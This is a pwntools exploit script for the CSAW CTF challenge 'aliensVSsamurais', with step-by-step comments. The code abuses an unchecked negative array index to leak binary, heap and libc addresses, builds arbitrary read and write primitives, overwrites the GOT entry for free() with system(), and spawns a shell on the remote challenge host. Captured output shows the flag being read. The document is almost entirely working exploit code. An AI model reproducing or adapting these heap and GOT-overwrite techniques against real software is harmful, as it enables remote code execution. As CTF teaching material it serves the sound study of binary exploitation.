#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

if not args["REMOTE"]:
    binary = ELF("./aliensVSsamurais-amd64-2.23-0ubuntu10")  # https://github.com/integeruser/bowkin
    libc = ELF("libs/amd64/0ubuntu10/libc-2.23.so")

    argv = [binary.path]
    envp = {"PWD": os.getcwd()}

    if args["GDB"]:
        io = gdb.debug(
            args=argv,
            env=envp,
            aslr=False,
            terminal=["tmux", "new-window"],
            gdbscript="""\
                s $aliens=0x5555557560C0
                s $samurais=0x555555756D40

                b *0x555555554D81
            """,
        )
    else:
        io = process(argv=argv, env=envp)
else:
    binary = ELF("./aliensVSsamurais")
    libc = ELF("libs/amd64/0ubuntu10/libc-2.23.so")

    io = remote("pwn.chal.csaw.io", 9004)

# by integeruser


def hatchery():
    io.sendlineafter("Daimyo, nani o shitaidesu ka?\n", "3")


def new_alien(alien_name):
    io.sendlineafter("Brood mother, what tasks do we have today.\n", "1")
    assert len(alien_name) > 7
    io.sendlineafter("How long is my name?\n", str(len(alien_name)))
    io.sendafter("What is my name?\n", alien_name)


def rename_alien_until_print(alien_idx):
    io.sendlineafter("Brood mother, what tasks do we have today.\n", "3")
    io.sendlineafter(
        "Brood mother, which one of my babies would you like to rename?\n",
        str(alien_idx),
    )
    io.recvuntil("Oh great what would you like to rename ")
    leak = io.recvuntil(" to?\n", drop=True)
    return leak


def consume_alien(alien_idx):
    io.sendlineafter("Brood mother, what tasks do we have today.\n", "2")
    io.sendlineafter("Which alien is unsatisfactory, brood mother?\n", str(alien_idx))


# for this exploit, we don't need any samurais; we move directly to the aliens part
hatchery()

# create an alien (needed later)
new_alien("AAAAAAAAAAAA")

# the subroutine `rename_alien()` contains the only vulnerability we need: no checks if
# the user-submitted index of the alien to rename is inside the bounds of `aliens[]` (the array containing
# the pointers to aliens (stored in .bss))

# at `aliens[-10]` we find the variable `__dso_handle`, whose value at runtime is its own address (it points to itself)

# since `rename_alien()` prints the name of the alien before changing it, renaming the alien at
# index -10 causes the value of `__dso_handle` to be printed on screen, thus leaking a pointer to .bss
__dso_handle_addr = u64(rename_alien_until_print(-10).ljust(8, "\0"))
binary.address = __dso_handle_addr - (binary.symbols["__dso_handle"] - binary.address)
io.success("binary.address: %#x" % binary.address)
# after printing the current name, `rename_alien()` allows us to change the name by reading 8 chars from the user
# in this way, we can change the content of `__dso_handle` (i.e. `aliens[-10]`) with
# the address of the array `aliens[]` (i.e the address of its first element)
io.send(p64(binary.symbols["aliens"])[:-1])


# at `aliens[-10]` there is now a pointer to `aliens[]`, which in turns points to the alien struct stored in the heap,
# and in turn points to the name of the alien stored somewhere else in the heap
# 0x0000555555756070│+0x00: 0x00005555557560c0  →  0x0000555555759430  →  0x0000555555759450  →  "AAAAAAAAAAAA"
# thus, by renaming again the alien at index -10, we can leak this time an address of the heap
a_heap_addr = u64(rename_alien_until_print(-10).ljust(8, "\0"))
heap_address = a_heap_addr - (0x555555759450 - 0x555555757000)
io.success("heap_address: %#x" % heap_address)
# we can write back any string: we won't use this anymore
io.send(p64(0x41414242424243))


# now, we leak an address from libc

# in .bss, we find an address from libc at `&aliens[]-0x30`
# to leak this value (arbitrary read) using the renaming technique showed above, we need to write somewhere
# in memory a pointer to a pointer to `&aliens[]-0x30`

# since we know the base address of the heap, we also know where aliens are malloc'ed in memory

# we allocate a new alien whose content is the concatenation of: 1) a pointer to the start of
# the chunk malloc'ed for this content + 0x8 (i.e a pointer to 2)); and 2) a pointer to the address
# whose content we want to leak
next_alien_allocated_at_addr = heap_address + (0x555555759490 - 0x555555757000)
new_alien(
    p64(next_alien_allocated_at_addr + 0x8) + p64(binary.symbols["aliens"] - 0x30)
)
# the content of the alien just created can be reached from `alien[]` using the index:
next_alien_idx = (next_alien_allocated_at_addr - binary.symbols["aliens"]) / 8
# if we try to rename this "fake alien", we end up leaking the content of `&aliens[]-0x30`
a_libc_addr = u64(rename_alien_until_print(next_alien_idx).ljust(8, "\0"))
libc.address = a_libc_addr - (0x7ffff7dd18e0 - 0x7ffff7a0d000)
io.success("libc.address: %#x" % libc.address)
# we write back the leaked address at its place so to not disrupt anything
io.send(p64(a_libc_addr)[:-1])


# we can use exactly the same technique for arbitrary write
next_alien_allocated_at_addr = next_alien_allocated_at_addr + 64
new_alien(p64(next_alien_allocated_at_addr + 0x8) + p64(binary.symbols["got.free"]))
next_alien_idx = (next_alien_allocated_at_addr - binary.symbols["aliens"]) / 8
_ = u64(rename_alien_until_print(next_alien_idx).ljust(8, "\0"))
io.send(p64(libc.symbols["system"])[:-1])
# now, `got.free` contains the address of `system()`

# create a new alien
new_alien("//bin/sh")
# and kill it to trigger a call to `free()` which in fact is `system()`
consume_alien(3)

io.interactive()
# $ ./aliensVSsamurais.py REMOTE
# [*] '/home/vagrant/vbox/alien-invasion/aliensVSsamurais'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] '/home/vagrant/vbox/alien-invasion/libc-amd64-2.23-0ubuntu10.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to pwn.chal.csaw.io on port 9004: Done
# [+] binary.address: 0x5643b10ec000
# [+] heap_address: 0x5643b1a3a400
# [+] libc.address: 0x7f8b918f0000
# [*] Switching to interactive mode
# EEEEEAAAAUGGHGGHGHGAAAAa
# //bin/sh: 0: can't access tty; job control turned off
# $ $ ls
# aliensVSsamurais  art.txt  flag.txt  run.sh
# $ $ cat flag.txt
# flag{s000000000000maa@@@@@nnnnnYYYB@@@@@@neeeelinggs}
